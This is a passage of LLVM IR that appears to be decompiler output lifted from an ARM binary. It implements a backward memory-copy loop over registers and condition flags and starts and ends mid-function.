  %v6_10690 = icmp slt i32 %v5_10690, 0
  store i1 %v6_10690, i1* %cpsr_v.global-to-local, align 1
  %v7_10690 = icmp slt i32 %v2_10690, 0
  store i1 %v7_10690, i1* %cpsr_n.global-to-local, align 1
  %v8_10690 = icmp eq i32 %v2_10684, 20
  store i1 %v8_10690, i1* %cpsr_z.global-to-local, align 1
  %v5_10694 = icmp slt i32 %v2_10684, 20
  br i1 %v5_10694, label %dec_label_pc_106b0, label %dec_label_pc_10698

dec_label_pc_10698:                               ; preds = %dec_label_pc_1068c, %dec_label_pc_10698.dec_label_pc_10698_crit_edge
  %v0_1069c = phi i32 [ %v1_106a4, %dec_label_pc_10698.dec_label_pc_10698_crit_edge ], [ %v0_1069c37, %dec_label_pc_1068c ]
  %v0_10698 = phi i32 [ %v0_10698.pre, %dec_label_pc_10698.dec_label_pc_10698_crit_edge ], [ %v0_1069836, %dec_label_pc_1068c ]
  %v1_10698 = add i32 %v0_10698, -4
  %v2_10698 = inttoptr i32 %v1_10698 to i32*
  %v3_10698 = load i32, i32* %v2_10698, align 4
  %v4_10698 = add i32 %v0_10698, -8
  %v5_10698 = inttoptr i32 %v4_10698 to i32*
  %v6_10698 = load i32, i32* %v5_10698, align 4
  store i32 %v6_10698, i32* %r4.global-to-local, align 4
  %v7_10698 = add i32 %v0_10698, -12
  %v8_10698 = inttoptr i32 %v7_10698 to i32*
  %v9_10698 = load i32, i32* %v8_10698, align 4
  store i32 %v9_10698, i32* %ip.global-to-local, align 4
  %v10_10698 = add i32 %v0_10698, -16
  %v11_10698 = inttoptr i32 %v10_10698 to i32*
  %v12_10698 = load i32, i32* %v11_10698, align 4
  store i32 %v12_10698, i32* %lr.global-to-local, align 4
  store i32 %v10_10698, i32* %r1.global-to-local, align 4
  %v1_1069c = add i32 %v0_1069c, -16
  %v2_1069c = inttoptr i32 %v1_1069c to i32*
  store i32 %v3_10698, i32* %v2_1069c, align 4
  %v4_1069c = add i32 %v0_1069c, -12
  %v5_1069c = inttoptr i32 %v4_1069c to i32*
  %v6_1069c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1069c, i32* %v5_1069c, align 4
  %v7_1069c = add i32 %v0_1069c, -8
  %v8_1069c = inttoptr i32 %v7_1069c to i32*
  %v9_1069c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_1069c, i32* %v8_1069c, align 4
  %v10_1069c = add i32 %v0_1069c, -4
  %v11_1069c = inttoptr i32 %v10_1069c to i32*
  %v12_1069c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1069c, i32* %v11_1069c, align 4
  store i32 %v1_1069c, i32* %r0.global-to-local, align 4
  %v0_106a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_106a0 = add i32 %v0_106a0, -4
  %v2_106a0 = inttoptr i32 %v1_106a0 to i32*
  %v3_106a0 = load i32, i32* %v2_106a0, align 4
  store i32 %v3_106a0, i32* @r3, align 4
  %v4_106a0 = add i32 %v0_106a0, -8
  %v5_106a0 = inttoptr i32 %v4_106a0 to i32*
  %v6_106a0 = load i32, i32* %v5_106a0, align 4
  store i32 %v6_106a0, i32* %r4.global-to-local, align 4
  %v7_106a0 = add i32 %v0_106a0, -12
  %v8_106a0 = inttoptr i32 %v7_106a0 to i32*
  %v9_106a0 = load i32, i32* %v8_106a0, align 4
  store i32 %v9_106a0, i32* @ip, align 4
  %v10_106a0 = add i32 %v0_106a0, -16
  %v11_106a0 = inttoptr i32 %v10_106a0 to i32*
  %v12_106a0 = load i32, i32* %v11_106a0, align 4
  store i32 %v12_106a0, i32* %lr.global-to-local, align 4
  store i32 %v10_106a0, i32* @r1, align 4
  %v1_106a4 = add i32 %v0_1069c, -32
  %v2_106a4 = inttoptr i32 %v1_106a4 to i32*
  store i32 %v3_106a0, i32* %v2_106a4, align 4
  %v4_106a4 = add i32 %v0_1069c, -28
  %v5_106a4 = inttoptr i32 %v4_106a4 to i32*
  %v6_106a4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_106a4, i32* %v5_106a4, align 4
  %v7_106a4 = add i32 %v0_1069c, -24
  %v8_106a4 = inttoptr i32 %v7_106a4 to i32*
  %v9_106a4 = load i32, i32* @ip, align 4
  store i32 %v9_106a4, i32* %v8_106a4, align 4
  %v10_106a4 = add i32 %v0_1069c, -20
  %v11_106a4 = inttoptr i32 %v10_106a4 to i32*
  %v12_106a4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_106a4, i32* %v11_106a4, align 4
  store i32 %v1_106a4, i32* %r0.global-to-local, align 4
  %v0_106a8 = load i32, i32* %r2.global-to-local, align 4
  %v2_106a8 = add i32 %v0_106a8, -32
  store i32 %v2_106a8, i32* %r2.global-to-local, align 4
  %v6_106ac = icmp slt i32 %v0_106a8, 32
  br i1 %v6_106ac, label %dec_label_pc_106b0.loopexit, label %dec_label_pc_10698.dec_label_pc_10698_crit_edge

dec_label_pc_10698.dec_label_pc_10698_crit_edge:  ; preds = %dec_label_pc_10698
  %v0_10698.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_10698

dec_label_pc_106b0.loopexit:                      ; preds = %dec_label_pc_10698
  %v4_106a8 = sub i32 31, %v0_106a8
  %v5_106a8 = and i32 %v4_106a8, %v0_106a8
  %v6_106a8 = icmp slt i32 %v5_106a8, 0
  %v7_106a8 = icmp slt i32 %v2_106a8, 0
  store i1 %v6_106a8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_106a8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_106b0

dec_label_pc_106b0:                               ; preds = %dec_label_pc_106b0.loopexit, %dec_label_pc_1068c
  %v6_106b8 = phi i32 [ %v1_106a4, %dec_label_pc_106b0.loopexit ], [ %v0_1069c37, %dec_label_pc_1068c ]
  %v0_106c0.pr = phi i32 [ %v2_106a8, %dec_label_pc_106b0.loopexit ], [ %v2_10690, %dec_label_pc_1068c ]
  %v4_106b0 = add i32 %v0_106c0.pr, 16
  %v6_106b0 = sub i32 0, %v0_106c0.pr
  %v7_106b0 = and i32 %v4_106b0, %v6_106b0
  %v8_106b0 = icmp slt i32 %v7_106b0, 0
  store i1 %v8_106b0, i1* %cpsr_v.global-to-local, align 1
  %v9_106b0 = icmp slt i32 %v4_106b0, 0
  store i1 %v9_106b0, i1* %cpsr_n.global-to-local, align 1
  %v10_106b0 = icmp eq i32 %v4_106b0, 0
  store i1 %v10_106b0, i1* %cpsr_z.global-to-local, align 1
  %v5_106b4 = icmp slt i32 %v0_106c0.pr, -16
  br i1 %v5_106b4, label %.thread2, label %bb148

bb148:                                            ; preds = %dec_label_pc_106b0
  %v6_106b4 = load i32, i32* @r1, align 4
  %v7_106b4 = add i32 %v6_106b4, -4
  %v8_106b4 = inttoptr i32 %v7_106b4 to i32*
  %v9_106b4 = load i32, i32* %v8_106b4, align 4
  store i32 %v9_106b4, i32* @r3, align 4
  %v10_106b4 = add i32 %v6_106b4, -8
  %v11_106b4 = inttoptr i32 %v10_106b4 to i32*
  %v12_106b4 = load i32, i32* %v11_106b4, align 4
  store i32 %v12_106b4, i32* %r4.global-to-local, align 4
  %v13_106b4 = add i32 %v6_106b4, -12
  %v14_106b4 = inttoptr i32 %v13_106b4 to i32*
  %v15_106b4 = load i32, i32* %v14_106b4, align 4
  store i32 %v15_106b4, i32* @ip, align 4
  %v16_106b4 = add i32 %v6_106b4, -16
  %v17_106b4 = inttoptr i32 %v16_106b4 to i32*
  %v18_106b4 = load i32, i32* %v17_106b4, align 4
  store i32 %v18_106b4, i32* %lr.global-to-local, align 4
  store i32 %v16_106b4, i32* @r1, align 4
  %v7_106b8 = add i32 %v6_106b8, -16
  %v8_106b8 = inttoptr i32 %v7_106b8 to i32*
  store i32 %v9_106b4, i32* %v8_106b8, align 4
  %v10_106b8 = add i32 %v6_106b8, -12
  %v11_106b8 = inttoptr i32 %v10_106b8 to i32*
  %v12_106b8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_106b8, i32* %v11_106b8, align 4
  %v13_106b8 = add i32 %v6_106b8, -8
  %v14_106b8 = inttoptr i32 %v13_106b8 to i32*
  %v15_106b8 = load i32, i32* @ip, align 4
  store i32 %v15_106b8, i32* %v14_106b8, align 4
  %v16_106b8 = add i32 %v6_106b8, -4
  %v17_106b8 = inttoptr i32 %v16_106b8 to i32*
  %v18_106b8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_106b8, i32* %v17_106b8, align 4
  store i32 %v7_106b8, i32* %r0.global-to-local, align 4
  %v6_106bc = load i32, i32* %r2.global-to-local, align 4
  %v7_106bc = add i32 %v6_106bc, -16
  store i32 %v7_106bc, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_106b0, %bb148
  %v6_106c8 = phi i32 [ %v7_106b8, %bb148 ], [ %v6_106b8, %dec_label_pc_106b0 ]
  %v0_106c0 = phi i32 [ %v7_106bc, %bb148 ], [ %v0_106c0.pr, %dec_label_pc_106b0 ]
  %v4_106c0 = add i32 %v0_106c0, 20
  store i32 %v4_106c0, i32* %r2.global-to-local, align 4
  %v6_106c0 = sub i32 0, %v0_106c0
  %v7_106c0 = and i32 %v4_106c0, %v6_106c0
  %v8_106c0 = icmp slt i32 %v7_106c0, 0
  store i1 %v8_106c0, i1* %cpsr_v.global-to-local, align 1
  %v9_106c0 = icmp slt i32 %v4_106c0, 0
  store i1 %v9_106c0, i1* %cpsr_n.global-to-local, align 1
  %v10_106c0 = icmp eq i32 %v4_106c0, 0
  store i1 %v10_106c0, i1* %cpsr_z.global-to-local, align 1
  %v5_106c4 = icmp slt i32 %v0_106c0, -20
  br i1 %v5_106c4, label %.thread4, label %bb149

bb149:                                            ; preds = %.thread2
  %v6_106c4 = load i32, i32* @r1, align 4
  %v7_106c4 = add i32 %v6_106c4, -4
  %v8_106c4 = inttoptr i32 %v7_106c4 to i32*
  %v9_106c4 = load i32, i32* %v8_106c4, align 4
  store i32 %v9_106c4, i32* @r3, align 4
  %v10_106c4 = add i32 %v6_106c4, -8
  %v11_106c4 = inttoptr i32 %v10_106c4 to i32*
  %v12_106c4 = load i32, i32* %v11_106c4, align 4
  store i32 %v12_106c4, i32* @ip, align 4
  %v13_106c4 = add i32 %v6_106c4, -12
  %v14_106c4 = inttoptr i32 %v13_106c4 to i32*
  %v15_106c4 = load i32, i32* %v14_106c4, align 4
  store i32 %v15_106c4, i32* %lr.global-to-local, align 4
  store i32 %v13_106c4, i32* @r1, align 4
  %v7_106c8 = add i32 %v6_106c8, -12
  %v8_106c8 = inttoptr i32 %v7_106c8 to i32*
  store i32 %v9_106c4, i32* %v8_106c8, align 4
  %v10_106c8 = add i32 %v6_106c8, -8
  %v11_106c8 = inttoptr i32 %v10_106c8 to i32*
  %v12_106c8 = load i32, i32* @ip, align 4
  store i32 %v12_106c8, i32* %v11_106c8, align 4
  %v13_106c8 = add i32 %v6_106c8, -4
  %v14_106c8 = inttoptr i32 %v13_106c8 to i32*
  %v15_106c8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_106c8, i32* %v14_106c8, align 4
  store i32 %v7_106c8, i32* %r0.global-to-local, align 4
  %v6_106cc = load i32, i32* %r2.global-to-local, align 4
  %v7_106cc = add i32 %v6_106cc, -12
  store i32 %v7_106cc, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb149
  %v6_106ec45 = phi i32 [ %v6_106c8, %.thread2 ], [ %v7_106c8, %bb149 ]
  %v0_106d443 = phi i32 [ %v4_106c0, %.thread2 ], [ %v7_106cc, %bb149 ]
  %v2_106d0 = load i8*, i8** %stack_var_-8, align 4
  %v3_106d0 = ptrtoint i8* %v2_106d0 to i32
  store i32 %v3_106d0, i32* @r4, align 4
  store i32 %v8_1068c, i32* @lr, align 4
  br label %dec_label_pc_106d4

dec_label_pc_106d4:                               ; preds = %dec_label_pc_10684, %.thread4
  %v7_106e4 = phi i32 [ %v0_1069c37, %dec_label_pc_10684 ], [ %v6_106ec45, %.thread4 ]
  %v0_106d4 = phi i32 [ %v2_10684, %dec_label_pc_10684 ], [ %v0_106d443, %.thread4 ]
  %v2_106d4 = add i32 %v0_106d4, 8
  store i32 %v2_106d4, i32* %r2.global-to-local, align 4
  %v4_106d4 = sub i32 0, %v0_106d4
  %v5_106d4 = and i32 %v2_106d4, %v4_106d4
  %v6_106d4 = icmp slt i32 %v5_106d4, 0
  store i1 %v6_106d4, i1* %cpsr_v.global-to-local, align 1
  %v7_106d4 = icmp slt i32 %v2_106d4, 0
  store i1 %v7_106d4, i1* %cpsr_n.global-to-local, align 1
  %v8_106d4 = icmp eq i32 %v2_106d4, 0
  store i1 %v8_106d4, i1* %cpsr_z.global-to-local, align 1
  %v5_106d8 = icmp slt i32 %v0_106d4, -8
  br i1 %v5_106d8, label %bb151, label %dec_label_pc_106dc

dec_label_pc_106dc:                               ; preds = %dec_label_pc_106d4
  %v6_106dc = add i32 %v0_106d4, 4
  store i32 %v6_106dc, i32* %r2.global-to-local, align 4
  %v8_106dc = sub i32 -5, %v0_106d4
  %v9_106dc = and i32 %v8_106dc, %v2_106d4
  %v10_106dc = icmp slt i32 %v9_106dc, 0
  store i1 %v10_106dc, i1* %cpsr_v.global-to-local, align 1
  %v11_106dc = icmp slt i32 %v6_106dc, 0
  store i1 %v11_106dc, i1* %cpsr_n.global-to-local, align 1
  %v12_106dc = icmp eq i32 %v2_106d4, 4
  store i1 %v12_106dc, i1* %cpsr_z.global-to-local, align 1
  %v5_106e0 = icmp slt i32 %v2_106d4, 4
  %v6_106e0 = load i32, i32* @r1, align 4
  %v7_106e0 = add i32 %v6_106e0, -4
  %v8_106e0 = inttoptr i32 %v7_106e0 to i32*
  %v9_106e0 = load i32, i32* %v8_106e0, align 4
  store i32 %v9_106e0, i32* @r3, align 4
  br i1 %v5_106e0, label %.thread8, label %bb150

.thread8:                                         ; preds = %dec_label_pc_106dc
  store i32 %v7_106e0, i32* @r1, align 4
  %v8_106e4 = add i32 %v7_106e4, -4
  %v9_106e4 = inttoptr i32 %v8_106e4 to i32*
  store i32 %v9_106e0, i32* %v9_106e4, align 4
  %v10_106e4 = load i32, i32* %r0.global-to-local, align 4
  %v11_106e4 = add i32 %v10_106e4, -4
  store i32 %v11_106e4, i32* %r0.global-to-local, align 4
  %v0_106f4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb151

bb150:                                            ; preds = %dec_label_pc_106dc
  %v10_106e8 = add i32 %v6_106e0, -8
  %v11_106e8 = inttoptr i32 %v10_106e8 to i32*
  %v12_106e8 = load i32, i32* %v11_106e8, align 4
  store i32 %v12_106e8, i32* @ip, align 4
  store i32 %v10_106e8, i32* @r1, align 4
  %v7_106ec = add i32 %v7_106e4, -8
  %v8_106ec = inttoptr i32 %v7_106ec to i32*
  store i32 %v9_106e0, i32* %v8_106ec, align 4
  %v10_106ec = add i32 %v7_106e4, -4
  %v11_106ec = inttoptr i32 %v10_106ec to i32*
  %v12_106ec = load i32, i32* @ip, align 4
  store i32 %v12_106ec, i32* %v11_106ec, align 4
  store i32 %v7_106ec, i32* %r0.global-to-local, align 4
  %v6_106f0 = load i32, i32* %r2.global-to-local, align 4
  %v7_106f0 = add i32 %v6_106f0, -4
  store i32 %v7_106f0, i32* %r2.global-to-local, align 4
  br label %bb151

bb151:                                            ; preds = %.thread8, %.thread14, %dec_label_pc_106d4, %dec_label_pc_10664, %dec_label_pc_10898, %dec_label_pc_1082c, %dec_label_pc_107c0, %bb150
  %v2_106f8 = phi i32 [ %v11_106e4, %.thread8 ], [ %v0_1079020, %.thread14 ], [ %v7_106e4, %dec_label_pc_106d4 ], [ %v2_10668, %dec_label_pc_10664 ], [ %v2_1070453, %dec_label_pc_10898 ], [ %v2_1070452, %dec_label_pc_1082c ], [ %v2_1070451, %dec_label_pc_107c0 ], [ %v7_106ec, %bb150 ]
  %v0_106f4 = phi i32 [ %v0_106f4.pre, %.thread8 ], [ %v2_10738, %.thread14 ], [ %v2_106d4, %dec_label_pc_106d4 ], [ %v2_1066c, %dec_label_pc_10664 ], [ %v0_106f449, %dec_label_pc_10898 ], [ %v0_106f448, %dec_label_pc_1082c ], [ %v0_106f447, %dec_label_pc_107c0 ], [ %v7_106f0, %bb150 ]
  %v1_106f4 = add i32 %v0_106f4, 4
  store i32 %v1_106f4, i32* @r2, align 4
  %v3_106f4 = sub i32 0, %v0_106f4
  %v4_106f4 = and i32 %v1_106f4, %v3_106f4
  %v5_106f4 = icmp slt i32 %v4_106f4, 0
  store i1 %v5_106f4, i1* %cpsr_v.global-to-local, align 1
  %v6_106f4 = icmp slt i32 %v1_106f4, 0
  store i1 %v6_106f4, i1* %cpsr_n.global-to-local, align 1
  %v7_106f4 = icmp eq i32 %v1_106f4, 0
  store i1 %v7_106f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_106f4, label %.thread130, label %bb152

bb152:                                            ; preds = %bb151
  %v1_106fc = add i32 %v0_106f4, 2
  %v3_106fc = sub i32 -3, %v0_106f4
  %v4_106fc = and i32 %v3_106fc, %v1_106f4
  %v5_106fc = icmp slt i32 %v4_106fc, 0
  store i1 %v5_106fc, i1* %cpsr_v.global-to-local, align 1
  %v6_106fc = icmp slt i32 %v1_106fc, 0
  store i1 %v6_106fc, i1* %cpsr_n.global-to-local, align 1
  %v7_106fc = icmp eq i32 %v1_106f4, 2
  store i1 %v7_106fc, i1* %cpsr_z.global-to-local, align 1
  %v0_10700 = load i32, i32* @r1, align 4
  %v1_10700 = add i32 %v0_10700, -1
  %v2_10700 = inttoptr i32 %v1_10700 to i8*
  %v3_10700 = load i8, i8* %v2_10700, align 1
  %v4_10700 = zext i8 %v3_10700 to i32
  store i32 %v4_10700, i32* @r3, align 4
  store i32 %v1_10700, i32* @r1, align 4
  %v3_10704 = add i32 %v2_106f8, -1
  %v4_10704 = inttoptr i32 %v3_10704 to i8*
  store i8 %v3_10700, i8* %v4_10704, align 1
  %v5_10704 = load i32, i32* %r0.global-to-local, align 4
  %v6_10704 = add i32 %v5_10704, -1
  store i32 %v6_10704, i32* %r0.global-to-local, align 4
  %v0_10708 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_10708 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_10708 = xor i1 %v0_10708, %v1_10708
  br i1 %v2_10708, label %.thread129, label %bb153

bb153:                                            ; preds = %bb152
  %v3_10708 = load i32, i32* @r1, align 4
  %v4_10708 = add i32 %v3_10708, -1
  %v5_10708 = inttoptr i32 %v4_10708 to i8*
  %v6_10708 = load i8, i8* %v5_10708, align 1
  %v7_10708 = zext i8 %v6_10708 to i32
  store i32 %v7_10708, i32* @r3, align 4
  store i32 %v4_10708, i32* @r1, align 4
  %v6_1070c = add i32 %v5_10704, -2
  %v7_1070c = inttoptr i32 %v6_1070c to i8*
  store i8 %v6_10708, i8* %v7_1070c, align 1
  %v8_1070c = load i32, i32* %r0.global-to-local, align 4
  %v9_1070c = add i32 %v8_1070c, -1
  store i32 %v9_1070c, i32* %r0.global-to-local, align 4
  %v1_10710.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_10710.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb152, %bb153
  %v7_10714 = phi i32 [ %v9_1070c, %bb153 ], [ %v6_10704, %bb152 ]
  %v2_10714 = phi i1 [ %v2_10710.pre, %bb153 ], [ %v1_10708, %bb152 ]
  %v1_10714 = phi i1 [ %v1_10710.pre, %bb153 ], [ %v0_10708, %bb152 ]
  %v0_10710 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_10710 = xor i1 %v2_10714, %v1_10714
  %v4_10710 = or i1 %v0_10710, %v3_10710
  br i1 %v4_10710, label %.thread130, label %bb154

bb154:                                            ; preds = %.thread129
  %v5_10710 = load i32, i32* @r1, align 4
  %v6_10710 = add i32 %v5_10710, -1
  %v7_10710 = inttoptr i32 %v6_10710 to i8*
  %v8_10710 = load i8, i8* %v7_10710, align 1
  %v9_10710 = zext i8 %v8_10710 to i32
  store i32 %v9_10710, i32* @r3, align 4
  store i32 %v6_10710, i32* @r1, align 4
  %v8_10714 = add i32 %v7_10714, -1
  %v9_10714 = inttoptr i32 %v8_10714 to i8*
  store i8 %v8_10710, i8* %v9_10714, align 1
  %v10_10714 = load i32, i32* %r0.global-to-local, align 4
  %v11_10714 = add i32 %v10_10714, -1
  store i32 %v11_10714, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_1071c:                               ; preds = %dec_label_pc_10674
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_1071c = icmp eq i32 %v1_10674, 1
  store i1 %v8_1071c, i1* %cpsr_n.global-to-local, align 1
  %v9_1071c = icmp eq i32 %v1_10674, 2
  store i1 %v9_1071c, i1* %cpsr_z.global-to-local, align 1
  %v1_10720 = add i32 %v2_10664, -1
  %v2_10720 = inttoptr i32 %v1_10720 to i8*
  %v3_10720 = load i8, i8* %v2_10720, align 1
  %v4_10720 = zext i8 %v3_10720 to i32
  store i32 %v4_10720, i32* @r3, align 4
  store i32 %v1_10720, i32* @r1, align 4
  %v3_10724 = add i32 %v2_10668, -1
  %v4_10724 = inttoptr i32 %v3_10724 to i8*
  store i8 %v3_10720, i8* %v4_10724, align 1
  %v5_10724 = load i32, i32* %r0.global-to-local, align 4
  %v6_10724 = add i32 %v5_10724, -1
  store i32 %v6_10724, i32* %r0.global-to-local, align 4
  br i1 %v8_1071c, label %.thread14, label %bb155

bb155:                                            ; preds = %dec_label_pc_1071c
  %v6_10728 = load i32, i32* @r1, align 4
  %v7_10728 = add i32 %v6_10728, -1
  %v8_10728 = inttoptr i32 %v7_10728 to i8*
  %v9_10728 = load i8, i8* %v8_10728, align 1
  %v10_10728 = zext i8 %v9_10728 to i32
  store i32 %v10_10728, i32* @r3, align 4
  store i32 %v7_10728, i32* @r1, align 4
  %v9_1072c = add i32 %v5_10724, -2
  %v10_1072c = inttoptr i32 %v9_1072c to i8*
  store i8 %v9_10728, i8* %v10_1072c, align 1
  %v11_1072c = load i32, i32* %r0.global-to-local, align 4
  %v12_1072c = add i32 %v11_1072c, -1
  store i32 %v12_1072c, i32* %r0.global-to-local, align 4
  br i1 %v9_1071c, label %.thread14, label %bb156

bb156:                                            ; preds = %bb155
  %v8_10730 = load i32, i32* @r1, align 4
  %v9_10730 = add i32 %v8_10730, -1
  %v10_10730 = inttoptr i32 %v9_10730 to i8*
  %v11_10730 = load i8, i8* %v10_10730, align 1
  %v12_10730 = zext i8 %v11_10730 to i32
  store i32 %v12_10730, i32* @r3, align 4
  store i32 %v9_10730, i32* @r1, align 4
  %v11_10734 = add i32 %v11_1072c, -2
  %v12_10734 = inttoptr i32 %v11_10734 to i8*
  store i8 %v11_10730, i8* %v12_10734, align 1
  %v13_10734 = load i32, i32* %r0.global-to-local, align 4
  %v14_10734 = add i32 %v13_10734, -1
  store i32 %v14_10734, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb155, %dec_label_pc_1071c, %bb156
  %v0_1079020 = phi i32 [ %v12_1072c, %bb155 ], [ %v6_10724, %dec_label_pc_1071c ], [ %v14_10734, %bb156 ]
  %v0_10738 = load i32, i32* %r2.global-to-local, align 4
  %v1_10738 = load i32, i32* @ip, align 4
  %v2_10738 = sub i32 %v0_10738, %v1_10738
  store i32 %v2_10738, i32* %r2.global-to-local, align 4
  %v4_10738 = xor i32 %v1_10738, %v0_10738
  %v5_10738 = xor i32 %v2_10738, %v0_10738
  %v6_10738 = and i32 %v5_10738, %v4_10738
  %v7_10738 = icmp slt i32 %v6_10738, 0
  store i1 %v7_10738, i1* %cpsr_v.global-to-local, align 1
  %v8_10738 = icmp slt i32 %v2_10738, 0
  store i1 %v8_10738, i1* %cpsr_n.global-to-local, align 1
  %v9_10738 = icmp eq i32 %v0_10738, %v1_10738
  store i1 %v9_10738, i1* %cpsr_z.global-to-local, align 1
  %v5_1073c = icmp slt i32 %v0_10738, %v1_10738
  br i1 %v5_1073c, label %bb151, label %dec_label_pc_10740

dec_label_pc_10740:                               ; preds = %.thread14
  %v0_10740 = load i32, i32* @r1, align 4
  %v1_10740 = urem i32 %v0_10740, 4
  store i32 %v1_10740, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_10740 = icmp eq i32 %v1_10740, 0
  store i1 %v2_10740, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10740, label %dec_label_pc_10684, label %dec_label_pc_10748

dec_label_pc_10748:                               ; preds = %dec_label_pc_1067c, %dec_label_pc_10740
  %v0_1079019 = phi i32 [ %v2_10668, %dec_label_pc_1067c ], [ %v0_1079020, %dec_label_pc_10740 ]
  %v0_1083c = phi i32 [ %v2_1066c, %dec_label_pc_1067c ], [ %v2_10738, %dec_label_pc_10740 ]
  %v0_10748 = phi i32 [ %v2_10664, %dec_label_pc_1067c ], [ %v0_10740, %dec_label_pc_10740 ]
  %v0_10750 = phi i32 [ %v1_1067c, %dec_label_pc_1067c ], [ %v1_10740, %dec_label_pc_10740 ]
  %v1_10748 = and i32 %v0_10748, -4
  store i32 %v1_10748, i32* %r1.global-to-local, align 4
  %v1_1074c = inttoptr i32 %v1_10748 to i32*
  %v2_1074c = load i32, i32* %v1_1074c, align 4
  store i32 %v2_1074c, i32* @r3, align 4
  %v7_10750 = icmp ult i32 %v0_10750, 2
  %v2_10834 = add i32 %v0_1083c, -12
  %v4_10834 = sub i32 11, %v0_1083c
  %v5_10834 = and i32 %v4_10834, %v0_1083c
  %v6_10834 = icmp slt i32 %v5_10834, 0
  store i1 %v6_10834, i1* %cpsr_v.global-to-local, align 1
  %v7_10834 = icmp slt i32 %v2_10834, 0
  store i1 %v7_10834, i1* %cpsr_n.global-to-local, align 1
  %v8_10834 = icmp eq i32 %v0_1083c, 12
  store i1 %v8_10834, i1* %cpsr_z.global-to-local, align 1
  %v5_10838 = icmp slt i32 %v0_1083c, 12
  br i1 %v7_10750, label %dec_label_pc_10834, label %dec_label_pc_10758

dec_label_pc_10758:                               ; preds = %dec_label_pc_10748
  %v8_10750 = icmp eq i32 %v0_10750, 2
  br i1 %v8_10750, label %dec_label_pc_107c8, label %dec_label_pc_1075c

dec_label_pc_1075c:                               ; preds = %dec_label_pc_10758
  br i1 %v5_10838, label %dec_label_pc_107a8, label %dec_label_pc_10764

dec_label_pc_10764:                               ; preds = %dec_label_pc_1075c
  store i32 %v2_10834, i32* %r2.global-to-local, align 4
  %v3_10768 = load i32, i32* @r4, align 4
  store i32 %v3_10768, i32* %stack_var_-12, align 4
  %v6_10768 = load i32, i32* @r5, align 4
  %v8_10768 = inttoptr i32 %v6_10768 to i8*
  store i8* %v8_10768, i8** %stack_var_-8, align 4
  %v11_10768 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1076c

dec_label_pc_1076c:                               ; preds = %dec_label_pc_1076c.dec_label_pc_1076c_crit_edge, %dec_label_pc_10764
  %v0_10790 = phi i32 [ %v1_10790, %dec_label_pc_1076c.dec_label_pc_1076c_crit_edge ], [ %v0_1079019, %dec_label_pc_10764 ]
  %v0_10770 = phi i32 [ %v0_10770.pre, %dec_label_pc_1076c.dec_label_pc_1076c_crit_edge ], [ %v1_10748, %dec_label_pc_10764 ]
  %v0_1076c = phi i32 [ %v0_1076c.pre, %dec_label_pc_1076c.dec_label_pc_1076c_crit_edge ], [ %v2_1074c, %dec_label_pc_10764 ]
  %v3_1076c = mul i32 %v0_1076c, 256
  store i32 %v3_1076c, i32* %lr.global-to-local, align 4
  %v1_10770 = add i32 %v0_10770, -4
  %v2_10770 = inttoptr i32 %v1_10770 to i32*
  %v3_10770 = load i32, i32* %v2_10770, align 4
  store i32 %v3_10770, i32* @r3, align 4
  %v4_10770 = add i32 %v0_10770, -8
  %v5_10770 = inttoptr i32 %v4_10770 to i32*
  %v6_10770 = load i32, i32* %v5_10770, align 4
  store i32 %v6_10770, i32* %r4.global-to-local, align 4
  %v7_10770 = add i32 %v0_10770, -12
  %v8_10770 = inttoptr i32 %v7_10770 to i32*
  %v9_10770 = load i32, i32* %v8_10770, align 4
  store i32 %v9_10770, i32* %r5.global-to-local, align 4
  %v10_10770 = add i32 %v0_10770, -16
  %v11_10770 = inttoptr i32 %v10_10770 to i32*
  %v12_10770 = load i32, i32* %v11_10770, align 4
  store i32 %v10_10770, i32* %r1.global-to-local, align 4
  %v4_10774 = udiv i32 %v12_10770, 16777216
  %v5_10774 = or i32 %v4_10774, %v3_1076c
  store i32 %v5_10774, i32* %lr.global-to-local, align 4
  %v3_10778 = mul i32 %v12_10770, 256
  %v4_1077c = udiv i32 %v9_10770, 16777216
  %v5_1077c = or i32 %v3_10778, %v4_1077c
  store i32 %v5_1077c, i32* @ip, align 4
  %v3_10780 = mul i32 %v9_10770, 256
  %v4_10784 = udiv i32 %v6_10770, 16777216
  %v5_10784 = or i32 %v3_10780, %v4_10784
  store i32 %v5_10784, i32* %r5.global-to-local, align 4
  %v3_10788 = mul i32 %v6_10770, 256
  %v4_1078c = udiv i32 %v3_10770, 16777216
  %v5_1078c = or i32 %v3_10788, %v4_1078c
  store i32 %v5_1078c, i32* %r4.global-to-local, align 4
  %v1_10790 = add i32 %v0_10790, -16
  %v2_10790 = inttoptr i32 %v1_10790 to i32*
  store i32 %v5_1078c, i32* %v2_10790, align 4
  %v4_10790 = add i32 %v0_10790, -12
  %v5_10790 = inttoptr i32 %v4_10790 to i32*
  %v6_10790 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_10790, i32* %v5_10790, align 4
  %v7_10790 = add i32 %v0_10790, -8
